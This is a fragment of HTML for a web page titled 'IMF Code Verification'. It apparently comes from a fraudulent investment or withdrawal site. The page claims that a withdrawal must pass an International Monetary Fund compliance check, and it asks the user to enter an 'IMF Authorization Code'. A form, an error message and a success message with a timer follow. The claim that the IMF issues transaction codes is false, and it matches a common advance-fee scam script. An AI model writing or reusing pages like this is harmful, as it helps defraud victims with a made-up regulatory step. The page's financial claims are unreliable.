      <h2>IMF Code Verification</h2>

      <p class="info-text">
        To complete your withdrawal, your transaction must first undergo an 
        <strong>International Monetary Fund (IMF) compliance verification</strong>.  
        <!-- <br><br> -->
        This process ensures that all international transfers meet global financial regulations, 
        including anti-money laundering (AML) and cross-border transaction monitoring standards.  
        <!-- <br><br> -->
        You are therefore required to provide a valid 
        <strong>IMF Authorization Code</strong> assigned to your transaction.  
        This code serves as confirmation that your transfer has been approved 
        through the international remittance clearance system.  
        <br><br>
        Please enter your <strong>IMF Code</strong> below to authorize and finalize the release of your funds. 
        Failure to provide the correct code will result in a delay in the completion of your withdrawal.
      </p>

      <form id="imfForm">
        <input type="text" id="imfInput" placeholder="Enter IMF Authorization Code" required />
        <button type="submit">Verify</button>
      </form>

      <p id="errorMsg" class="error hidden">❌ Invalid or unauthorized IMF Code. Please verify and try again.</p>

      <div id="timerContainer" class="hidden">
        <p>
          ✅ <strong>Code verified successfully!</strong><br>
          Your transaction is now being processed through the international settlement network.
          Please wait for confirmation. Do not close or refresh the page.
